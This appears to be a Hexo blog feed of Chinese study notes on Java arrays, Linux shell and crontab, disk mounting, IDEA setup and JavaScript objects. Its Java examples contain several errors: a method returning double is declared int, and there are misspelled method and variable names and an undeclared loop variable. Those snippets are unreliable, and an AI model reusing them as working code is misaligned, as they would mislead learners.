和println的区别在于是否换行</li><li>Java中判断类是否是同一个通过&#x3D;&#x3D;的方法来判断，而判断类的属性是否一致通过equals进行判断</li><li>调用java.io.*需要为所有的输入方法加上throws IOException<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//java输入字符</span><br><span class="line">public static char getChar() throws IOException</span><br><span class="line">&#123;</span><br><span class="line">String s = getString();</span><br><span class="line">return s.charAt(0);</span><br><span class="line">&#125;</span><br><span class="line">//String类的charAt()方法返回一个String类对象中某个特定位置的字符，在上面的例子中，是第一个字符，号码是0.这个方法避免了无关的字符留在输入缓存中，正是无关的字符导致后续的输入总是出现错误。</span><br><span class="line"></span><br><span class="line">//输入整数</span><br><span class="line">public int getInt() throws IOException</span><br><span class="line">&#123;</span><br><span class="line">String s = getString();</span><br><span class="line">return Integer.parseInt(s);</span><br><span class="line">&#125;</span><br><span class="line">//Integer类的parseInt()方法将字符串转成int型。</span><br><span class="line"></span><br><span class="line">// 输入浮点数</span><br><span class="line"></span><br><span class="line">public int getDouble() throws IOException</span><br><span class="line">&#123;</span><br><span class="line">String s = getString();</span><br><span class="line">Double aDub = Double.valueof(s);</span><br><span class="line">return aDub.doubleValue();</span><br><span class="line">&#125;</span><br><span class="line">//字符串先转换成一个Double型的对象（大写D，double类型的封装类）之后用doubleValue()方法将这个对象转换为double型。</span><br><span class="line">// float型同样有Float类和valueOf()和floatValue()方法</span><br></pre></td></tr></table></figure></li></ul><h1 id="数组array"><a href="#数组array" class="headerlink" title="数组array"></a>数组array</h1><ul><li>其中不允许有空的数据项，否则会出现删除查找困难需要判断，是否有空数据项，难以判断是否结尾。</li><li>查找平均数据项为N&#x2F;2</li></ul><h2 id="重复值问题"><a href="#重复值问题" class="headerlink" title="重复值问题"></a>重复值问题</h2><ul><li>判断关键字是否重复<br>||不允许重复|允许重复|<br>|-:-|-:-|-:-|<br>|查找|N&#x2F;2次比较|N次比较|<br>|插入|无比较，一次移动|无比较，一次移动|<br>|删除|N&#x2F;2次比较，N&#x2F;2次移动|N次比较，多于N&#x2F;2次移动|</li></ul><h2 id="数组操作"><a href="#数组操作" class="headerlink" title="数组操作"></a>数组操作</h2><ul><li>初始化数组<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int[] intArray;</span><br><span class="line">intArray = new int[100];</span><br><span class="line">//or</span><br><span class="line">int[] intArray = new int[100];</span><br><span class="line">//or</span><br><span class="line">int intArray[] = new int[100];</span><br><span class="line">// 自定义数组创建数组对象</span><br><span class="line">autoData[] carArray = new autoData[4000];</span><br><span class="line">//除非开始赋值否则它们将一直是特殊的null对象，尝试访问会出现空指针赋值的错误</span><br><span class="line">，访问前需要先赋值</span><br></pre></td></tr></table></figure></li><li>数组长度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int arrayLength = intArray.length;</span><br></pre></td></tr></table></figure></li><li>访问数组数据项<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">temp = intArray[3];</span><br><span class="line">intArray[7] = 66;</span><br><span class="line">//注意数组下标从0开始，所以上例中是第八个数组值</span><br></pre></td></tr></table></figure></li></ul><h2 id="用Java类设计数组程序"><a href="#用Java类设计数组程序" class="headerlink" title="用Java类设计数组程序"></a>用Java类设计数组程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">//lowArray.java</span><br><span class="line">// demonstrate array class with low-level interface</span><br><span class="line">// to run this program: C &gt; java LowArrayApp</span><br><span class="line"></span><br><span class="line">class LowArray</span><br><span class="line">&#123;</span><br><span class="line">private long[] a;//ref to array a</span><br><span class="line">public LowArray(int size)//constructor</span><br><span class="line">&#123; a = new long[size];&#125;//create array</span><br><span class="line">public void setElem(int index,long value) //setvalue</span><br><span class="line">&#123; a[index] = value;&#125;</span><br><span class="line">public long getElem(int index)//get vlaue</span><br><span class="line">&#123;return a[index];&#125;</span><br><span class="line">&#125;//end class LowArray</span><br><span class="line"></span><br><span class="line">class LowArrayApp</span><br><span class="line">&#123;</span><br><span class="line">public static void main(String[] args)</span><br><span class="line">&#123;</span><br><span class="line">LowArray arr;//reference</span><br><span class="line">arr = new LowArray(100);//create LOwArray object</span><br><span class="line">int nElems = 0;//number of items in array</span><br><span class="line">int j;//loop variable</span><br><span class="line"></span><br><span class="line">arr.setELem(0,77);//insert 10 items</span><br><span class="line">arr.setElem(1,99);</span><br><span class="line">arr.setElem(2,44);</span><br><span class="line">arr.setElem(3,55);</span><br><span class="line">arr.setElem(4,22);</span><br><span class="line">arr.setElem(5,88);</span><br><span class="line">arr.setElem(6,11);</span><br><span class="line">arr.setElem(7,00);</span><br><span class="line">arr.setElem(8,66);</span><br><span class="line">arr.setElem(9,33);</span><br><span class="line">nElems = 10;// now 10 items in array</span><br><span class="line"></span><br><span class="line">for (j = 0; j &lt; nElems; j++)// display items</span><br><span class="line">System.out.print(arr.getElem(j) + &quot; &quot;);</span><br><span class="line">System.out.println(&quot;&quot;);</span><br><span class="line">int searchKey = 26;//search for data item</span><br><span class="line">for (j = 0; j &lt; nElems; j++)//for each element</span><br><span class="line">if(arr.getELem(j) == searchKey)// found item?</span><br><span class="line">break;</span><br><span class="line">if(j == nElems)//no</span><br><span class="line">System.out.println(&quot;Can&#x27;t find &quot; + searchKey);</span><br><span class="line">else//yes</span><br><span class="line">System.out.println(&quot;Found &quot; + searchKey);</span><br><span class="line">// delete value 55</span><br><span class="line">for(j = 0; j &lt; nELems; k++)// higher ones down</span><br><span class="line">arr.setElem(k, arr.getElem(k+1));</span><br><span class="line">nElems--;//decrement size</span><br><span class="line">for(j = 0; j &lt; nElems; j++)// display items</span><br><span class="line">System.out.print( arr.getElem(j) + &quot; &quot;);</span><br><span class="line">System.out.println(&quot;&quot;);</span><br><span class="line">&#125;//end main()</span><br><span class="line">&#125;//end class LowArrayApp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 将普通的Ｊａｖａ数组封装仅LowArray类中。类中的数组隐藏了起来，它是私有的，所以只有LowArray 类中的方法才能访问它。其中的三个方法分别用来插入和检索一个数据项，和构造函数，创建一个特定大小的数组</span><br><span class="line">//LowArrayApp创建一个LowArray类的对象并用它储存和操作数据。可以将LowArray类想成是工具。LowArrayApp类使用者</span><br></pre></td></tr></table></figure><h2 id="定义更加泛用的接口"><a href="#定义更加泛用的接口" class="headerlink" title="定义更加泛用的接口"></a>定义更加泛用的接口</h2><pre><code>// highArray.java// demonstrates array class with high-level interface// to run this program: C&gt;java HighArrayApp</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> DataStructureAbstract, array, sort, stack, queue, linklist, recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nextthemes</title>
      <link href="/2019/08/13/nextthemes/"/>
      <url>/2019/08/13/nextthemes/</url>
      
        <content type="html"><![CDATA[<h1 id="Next主题配置"><a href="#Next主题配置" class="headerlink" title="Next主题配置"></a>Next主题配置</h1><h2 id="tags配置"><a href="#tags配置" class="headerlink" title="tags配置"></a>tags配置</h2><ol><li>打开主题配置文件</li><li>&#x2F;menu搜索菜单配置信息，将tags的注释</li><li>sudo hexo new page “tag” 创建新页面</li><li>在source下出现新的文件夹tags,编辑里面的index.md文件</li><li>添加type：tags</li></ol><h2 id="search配置"><a href="#search配置" class="headerlink" title="search配置"></a>search配置</h2><ol><li>本地安装npm install hexo-generator-search</li><li>修改主题配置文件</li><li>&#x2F;local search找到相关位置将enable:true设置</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> nextconfig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxshell</title>
      <link href="/2019/08/13/linuxshell/"/>
      <url>/2019/08/13/linuxshell/</url>
      
        <content type="html"><![CDATA[<h1 id="shell基本介绍"><a href="#shell基本介绍" class="headerlink" title="shell基本介绍"></a>shell基本介绍</h1><ul><li>提供用户与内核进行交互操作的一种接口</li><li>command是shell脚本的基本元素，可以在同一行顺序执行多个命令，用分号隔开</li></ul><h1 id="shell编程的示例"><a href="#shell编程的示例" class="headerlink" title="shell编程的示例"></a>shell编程的示例</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cd#切换到用户的根目录下，因为.bash_profile在根目录下</span><br><span class="line">. .bash_profile#配置用户的命令行环境</span><br><span class="line">date#显示日期命令</span><br><span class="line">who#显示当前用户命令</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>这段代码就是一个简单的脚本</li><li>其中“#!”符号称为“Sha-bang”符号，是Shell脚本的起始符号，目的是告诉系统解释器的目录在哪</li><li>常用的解释器为bash目录位置为bin&#x2F;bash下，其他的还有sed和awk</li></ul><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><ul><li>linux的命令已经在linuxbasic系列里有过介绍，这里只做补充重复的内容不会再出现,一下也只是联系一些命令的书写，不会罗列所有选项和意义忘记了可以通过man查询</li><li>useradd -g -G -D -d -m -u</li><li>usermod -d -e -g -l -p -s</li><li>userdel -r 删除用户同时删除&#x2F;home下对应用户的文件夹</li><li>passwd</li><li>groupadd</li><li>groupmod</li><li>groupdel</li></ul><h1 id="re-regular-expression"><a href="#re-regular-expression" class="headerlink" title="re(regular expression)"></a>re(regular expression)</h1><ul><li>正则表达式，用以快速定位想寻找的字符串<br>|元字符符号|元字符意义|<br>|-:-|-:-|<br>|<em>|0个或多个在</em>字符之前的普通字符|<br>|.|匹配任意一个字符|<br>|^|匹配行首或后面字符的非|<br>|$|匹配行尾|<br>|[]|匹配字符集合|<br>||转义符，屏蔽一个元字符的特殊意义|<br>|&lt;&gt;|精确匹配,用于精确匹配尖括号内反斜杠前的词|<br>|{n}|匹配前面字符出现n次|<br>|{n,}|匹配前面字符至少出现n次|<br>|{n,m}|匹配前面字符出现n-m次|</li></ul><hr><p>|扩展的元字符符号|意义|<br>|-:-|-:-|<br>|?|匹配0个或1个在其之前的那个普通字符|<br>|+|匹配1个或多个在其之前的普通字符|<br>|()|表示一个字符集合或用在expr中|<br>|竖线(不知道markdown怎么转义竖线)|表示或，匹配一组可选的字符|</p><h2 id="特例"><a href="#特例" class="headerlink" title="特例"></a>特例</h2><ul><li>^$ 表示空行</li><li>[^] 其中的^表示取反</li><li>JO{3}B表示O字符出现三次</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux, shell, re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic6</title>
      <link href="/2019/08/12/linuxbasic6/"/>
      <url>/2019/08/12/linuxbasic6/</url>
      
        <content type="html"><![CDATA[<h1 id="linux计划任务"><a href="#linux计划任务" class="headerlink" title="linux计划任务"></a>linux计划任务</h1><h2 id="crond-任务调度"><a href="#crond-任务调度" class="headerlink" title="crond 任务调度"></a>crond 任务调度</h2><ul><li>定时调度脚本代码执行</li><li>-e编辑crontab定时任务</li><li>-l查询crontab任务</li><li>-r删除当前用户所有的crontab任务</li><li>对于简单的任务可以直接在crontab中加入任务即可</li><li>对于复杂任务需要shell编程（脚本）</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//命令行执行</span><br><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">五个星号分别表示不同的时间</span><br><span class="line">第一个*一个小时当中的第几分钟0-59</span><br><span class="line">第二个*一天当中第几个小时0-23</span><br><span class="line">第三个* 一个月当中的第几天1-31</span><br><span class="line">第四个* 一年当中第几个月1-12</span><br><span class="line">第五个*一周当中周几0-7(07都代表周日）</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//下面代码代表每小时的每分钟执行ls -l /etc/ &gt; /tmp/to.txt 命令</span><br><span class="line"></span><br><span class="line">*/1 * * * * ls -l /etc &gt;&gt; /tmp/to.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>|特殊符号|含义|<br>|-:-|-:-|<br>|*|代表任意时间。<br>|,|代表不连续的时间。比如“0 8,12,16 &#x2F;**<em>” 命令就代表在每天的8点0分，12点0分，16点0分都执行一次命令|<br>|-|代表连续的时间范围内。比如”0 5 * * 1-6命令”，代表在周一到周六的凌晨5点0分执行任务|<br>|</em>&#x2F;n|代表每隔多久执行一次。比如“*&#x2F;10 * * * *命令”，代表每隔10分钟执行一遍命令|</p><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><h3 id="每隔一分钟，就将当前日期信息更新追加到-Desktop-test文件中"><a href="#每隔一分钟，就将当前日期信息更新追加到-Desktop-test文件中" class="headerlink" title="每隔一分钟，就将当前日期信息更新追加到~&#x2F;Desktop&#x2F;test文件中"></a>每隔一分钟，就将当前日期信息更新追加到~&#x2F;Desktop&#x2F;test文件中</h3><ol><li>先编写一个文件 &#x2F;home&#x2F;mytask1.sh</li><li>mytask1.sh内写：date &gt;&gt; ~&#x2F;Desktop&#x2F;test</li><li>给mytask1.sh一个可执行权限chmod 744 &#x2F;home&#x2F;mytask1.sh</li><li>cronteb -e </li><li>*&#x2F;1 * * * * &#x2F;home&#x2F;mytask1.sh</li><li>成功</li></ol><hr><h1 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h1><ul><li>将磁盘挂载在根目录下的某一个目录中</li><li>lsblk -f记忆指令方法：老师不离开（记忆有时可以通过输入法给予快速提示，比如：按时交付了撒酒疯 asjflsjf 输入法会给与最合理的匹配，用于快速记忆无规律指令）</li></ul><h2 id="挂载案例"><a href="#挂载案例" class="headerlink" title="挂载案例"></a>挂载案例</h2><ul><li>虚拟机增加一块新的硬盘，增加完后重启</li><li>分区fdisk &#x2F;dev&#x2F;sdb之后依次选择m n p 1 w</li><li>格式化mkfs -t ext4（你要格式化成什么文件类型）  &#x2F;dev&#x2F;sdb1(这个是你要格式化的硬盘)</li><li>挂载<ul><li>先创建一个目录用于挂载</li><li>挂载 mount &#x2F;dev&#x2F;sdb1挂载目录</li><li>重启后会恢复</li></ul></li><li>设置可以自动挂载 <ul><li>vim &#x2F;etc&#x2F;fstab</li><li>编辑 &#x2F;dev&#x2F;sdb1&#x2F;要挂载的目录etc4defaults0 0</li><li>编辑完成后退出</li><li>命令行输入mount -a</li><li>重启</li></ul></li></ul><h2 id="卸载磁盘"><a href="#卸载磁盘" class="headerlink" title="卸载磁盘"></a>卸载磁盘</h2><ul><li>umount 挂载磁盘名称 or 挂载目录名称</li></ul><h2 id="磁盘情况查询"><a href="#磁盘情况查询" class="headerlink" title="磁盘情况查询"></a>磁盘情况查询</h2><ul><li>用于查看磁盘的使用情况</li><li>df -lh</li></ul><h2 id="查看指定目录磁盘占用情况"><a href="#查看指定目录磁盘占用情况" class="headerlink" title="查看指定目录磁盘占用情况"></a>查看指定目录磁盘占用情况</h2><ul><li>du <ul><li>-s 指定目录的大小汇总</li><li>-h 带计量单位</li><li>-a 含文件</li><li>-max-depth&#x3D;1 子目录深度</li><li>-c 列出明细同时增加汇总值</li></ul></li><li>统计目录下有多少文件<ul><li>ls -l &#x2F;home | grep “^-“ | wc -lls查看指定目录|过滤出其中的以-开头的文件|wc -l是统计数量 </li><li>如果要递归统计 ls -lR …</li></ul></li></ul><hr><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><ul><li>-name文件名方式查找例find &#x2F;查找目录 -name 查找文件名，可以采用通配符</li><li>-user 查找指定用户名的所有文件</li><li>-size 按照指定文件大小查找文件</li></ul><h2 id="locate指令"><a href="#locate指令" class="headerlink" title="locate指令"></a>locate指令</h2><ul><li>可以快速定位文件位置</li><li>第一次运行时必须使用updatedb指令创建locate数据库</li></ul><hr><h1 id="这次课程中遇到问题"><a href="#这次课程中遇到问题" class="headerlink" title="这次课程中遇到问题"></a>这次课程中遇到问题</h1><ul><li>编辑时碰到触摸板导致卡死，解决方法：菜单栏终端下的只读勾选了，取消即可</li><li>编辑时误按ctrl + s, 解决办法： ctrl + q 解决</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ideaIDE</title>
      <link href="/2019/08/11/ideaIDE/"/>
      <url>/2019/08/11/ideaIDE/</url>
      
        <content type="html"><![CDATA[<h1 id="idea配置"><a href="#idea配置" class="headerlink" title="idea配置"></a>idea配置</h1><h2 id="idea安装位置"><a href="#idea安装位置" class="headerlink" title="idea安装位置"></a>idea安装位置</h2><ul><li>&#x2F;usr&#x2F;local&#x2F;idea&#x2F;</li></ul><h2 id="idea配置文件"><a href="#idea配置文件" class="headerlink" title="idea配置文件"></a>idea配置文件</h2><ul><li>&#x2F;usr&#x2F;local&#x2F;idea&#x2F;bin&#x2F;idea.vmoptions文件</li><li>文件可以改变idea的运存缓存等信息</li></ul><h2 id="idea的启动文件"><a href="#idea的启动文件" class="headerlink" title="idea的启动文件"></a>idea的启动文件</h2><ul><li>&#x2F;usr&#x2F;local&#x2F;idea&#x2F;bin&#x2F;idea.sh文件</li><li>快速打开可以将  sudo ln -s &#x2F;idea安装目录&#x2F;bin&#x2F;idea.sh &#x2F;usr&#x2F;bin&#x2F; 这样就可以在命令行启动idea</li></ul><h2 id="idea的家目录下配置文件"><a href="#idea的家目录下配置文件" class="headerlink" title="idea的家目录下配置文件"></a>idea的家目录下配置文件</h2><ul><li>第一次启动后会在~&#x2F;.IdeaIC20XX.X文件夹，里面有两个文件夹<ul><li>config 中记录了在idea的部分setting中的用户配置</li><li>system 中记录了缓存，编译，日志，框架等用户配置信息</li></ul></li><li>config 中也有idea64.vmoptions文件，建议修改这个文件，加快idea运行速度。</li></ul><h1 id="idea项目位置"><a href="#idea项目位置" class="headerlink" title="idea项目位置"></a>idea项目位置</h1><ul><li>~&#x2F;IdeaProjects&#x2F;</li><li>类似于eclipse中的workspaces</li><li>新建java项目后会多出项目的文件夹</li></ul><h2 id="src文件夹"><a href="#src文件夹" class="headerlink" title="src文件夹"></a>src文件夹</h2><ul><li>随项目建立，存放包和java文件</li></ul><h2 id="out文件夹"><a href="#out文件夹" class="headerlink" title="out文件夹"></a>out文件夹</h2><ul><li>随着项目运行建立，存放编译好的class文件</li></ul><h1 id="idea的插件"><a href="#idea的插件" class="headerlink" title="idea的插件"></a>idea的插件</h1><h2 id="ideavim"><a href="#ideavim" class="headerlink" title="ideavim"></a>ideavim</h2><ul><li>默认在插件列表了，安装即可</li><li>配置文件存放在~&#x2F;.ideavimrc<ul><li>可以设置leader键，但是不能使用插件</li></ul></li><li>重启进入idea生效配置后使用vim编辑器，建议还是多设置写commandmode的leader快捷键，这样可以讲编辑的影响降到最低</li><li>:actionlist可以查看vim能设置的idea相关快捷键</li><li>设置方法nnoremap <leader>gc :action GotoClass<CR></li></ul><h1 id="idea快捷键"><a href="#idea快捷键" class="headerlink" title="idea快捷键"></a>idea快捷键</h1><ul><li>可以设置成类似eclipse的快捷键，当然还是有一部分会不一样。我还是决定是适应新快捷键</li><li>设置位置setting中的keymap</li></ul><h2 id="有时间再补快捷键列表"><a href="#有时间再补快捷键列表" class="headerlink" title="有时间再补快捷键列表"></a>有时间再补快捷键列表</h2><h1 id="idea模板"><a href="#idea模板" class="headerlink" title="idea模板"></a>idea模板</h1><ul><li>插入文档注释<ul><li>Setting 中的File and Code Templates中设置</li></ul></li><li>Setting 中的Live Templateplates中设置简写补全模板<ul><li>main 补全public static void main(String[] args){</li><li>sout 补全System.out.println()</li><li>可以自己设置</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> idea </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript3</title>
      <link href="/2019/08/10/javascript3/"/>
      <url>/2019/08/10/javascript3/</url>
      
        <content type="html"><![CDATA[<h1 id="javascript对象和类"><a href="#javascript对象和类" class="headerlink" title="javascript对象和类"></a>javascript对象和类</h1><h2 id="内部对象"><a href="#内部对象" class="headerlink" title="内部对象"></a>内部对象</h2><ul><li>动态对象<ul><li>需用new关键字来创建一个对象示例，才能使用“对象实例名.成员”的方式来访问其属性和方法</li></ul></li><li>静态对象<ul><li>不需要用new关键字创建对象实例，直接使用“对象名.成员”的方式来访问其属性和方法即可</li></ul></li></ul><h3 id="Object对象"><a href="#Object对象" class="headerlink" title="Object对象"></a>Object对象</h3><ul><li><p>创建Object对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj = new Object([value])</span><br></pre></td></tr></table></figure><ul><li>obj 为必选项。要赋值为Object对象的变量名</li><li>value 可选项。任意一种Jscript基本数据类型（Number、Boolean or String）如果value是一个对象，返回不做改动的该对象。如果value为null,undefined or 没有给出，则产生一个没有内容的对象。</li></ul></li><li><p>Object 对象的属性</p><ul><li>prototype属性</li></ul>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">objectName.prototype</span><br><span class="line">## 该属性返回对象类型原型的引用</span><br><span class="line">## 参数说明： objectName:对象名称</span><br><span class="line">## 用prototype属性可以提供对象的类的一组基本功能。对象的新实例“继承”赋予该对象原型的操作</span><br><span class="line"></span><br><span class="line">function array_max()&#123;</span><br><span class="line">var i,max = this[0];</span><br><span class="line">for(i = 1;i &lt; this.length; i++)&#123;</span><br><span class="line">if(max &lt; this[i])</span><br><span class="line">max = this[i];</span><br><span class="line">&#125;</span><br><span class="line">return max</span><br><span class="line">&#125;</span><br><span class="line">Array.prototype.max = array_max;//注意这里没有括号</span><br><span class="line">var x = new Array(1,2,3,4,5,6);</span><br><span class="line">var y = x.max();</span><br><span class="line"></span><br><span class="line">//上面的代码执行后，y保存数组x的最大值</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>constructor属性  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// object.constructor</span><br><span class="line">// 参数说明object:必选项对象或者函数的名称。constructor属性是所有具有prototype的对象的成员。他们包括除了Global和MAth对象以外的所有Jscript固有对象。constructor属性保存了对构造特定对象市里的函数引用</span><br><span class="line"></span><br><span class="line">x= new String(&quot;Hi&quot;);</span><br><span class="line">if(x.constructor == String)</span><br><span class="line">//进行处理（条件为真）</span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">function MyFunc()&#123;</span><br><span class="line">//函数体</span><br><span class="line">&#125;</span><br><span class="line">y = new MyFunc;</span><br><span class="line">if(y.constructor == MyFunc)</span><br><span class="line">//进行处理（条件为真）</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Object对象的方法"><a href="#Object对象的方法" class="headerlink" title="Object对象的方法"></a>Object对象的方法</h3><h4 id="toLocaleString-方法"><a href="#toLocaleString-方法" class="headerlink" title="toLocaleString()方法"></a>toLocaleString()方法</h4><ul><li>该方法返回一个日期，该日期使用当前区域设置并已被转换为字符串</li><li>dataObj.toLocaleString()<ul><li>参数说明dataObj:必选项。为任意Data对象</li><li>toLocaleString()方法返回一个String对象，该对象中包括了用当前区域设置的默认格式表示的日期（需要注意在不同时间段的时间显示格式是不同的注意区分）</li></ul></li></ul><h4 id="toString-方法"><a href="#toString-方法" class="headerlink" title="toString() 方法"></a>toString() 方法</h4><ul><li>该方法返回对象的字符串表示</li><li>objectname.toString([radix])<ul><li>参数说明objectname必选项。要得到字符串表示的对象</li><li>radix 可选项，指定将数字值转换为字符串时的进制</li></ul></li></ul><p>| 对象|操作|<br>|-:-|-:-|<br>|Array|将Array的元素转换为字符串，结果字符串由逗号分隔且连接起来|<br>|Boolean|如果Boolean值是true,则返回true;否则返回false|<br>|Date|返回日期的文字表示法|<br>|Error|返回一个包含相关错误消息的字符串|<br>|Function|返回如下格式的字符串，其中functionname 是被调用的toString()方法函数的名称：function functionname(){[native code]}|<br>|Number|返回数字的文字表示|<br>|String|返回String 对象的值|<br>|默认|返回[object objectname],其中objectname是对象类型的名称|</p><h4 id="valueOf-方法"><a href="#valueOf-方法" class="headerlink" title="valueOf()方法"></a>valueOf()方法</h4><ul><li>返回指定对象的原始值</li><li>object.valueOf()<ul><li>object是任意固有javascript对象<br>|对象|返回值|<br>|-:-|-:-|<br>|Array|数组的元素被转换为字符串，这些字符串由逗号分隔，并连接在一起。其操作与Array.toString和Array.join方法相同|<br>|boolean|Boolean值|<br>|Date|储存的时间是从1970年1月1日午夜开始记得毫秒数|<br>|Function|函数本身|<br>|Number|数字值|<br>|Object|对象本身，这是默认情况|<br>|String|字符串值|</li></ul></li></ul><h2 id="String对象"><a href="#String对象" class="headerlink" title="String对象"></a>String对象</h2><ul><li>动态对象</li><li>主要用于处理和格式化文本字符串以及定位字符串中的子字符串</li></ul><h3 id="创建String对象"><a href="#创建String对象" class="headerlink" title="创建String对象"></a>创建String对象</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><ul><li>var newstr &#x3D; new String(StringText)<ul><li>newstr 创建的String对象名</li><li>StringText 字符串文本</li><li>例 var newstr &#x3D; new String(“欢迎使用JavaScript脚本”)</li><li>实际上任意引号引起来的字符串常量都是String对象，可以直接使用String对象的方法和属性</li><li>字符串返回的是String类型,但是String对象返回的是Object类型</li></ul></li></ul><h3 id="String对象的属性"><a href="#String对象的属性" class="headerlink" title="String对象的属性"></a>String对象的属性</h3><h4 id="length属性"><a href="#length属性" class="headerlink" title="length属性"></a>length属性</h4><ul><li>stringObject.length</li><li>用于获得当前字符串的长度</li></ul><h4 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h4><ul><li>Object.constructor</li><li>对当前对象的函数引用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 作用1类似于Object对象的使用，下面展示另一种应用</span><br><span class="line">// 获取当前对象所引用的函数代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function chronicle(name,year)</span><br><span 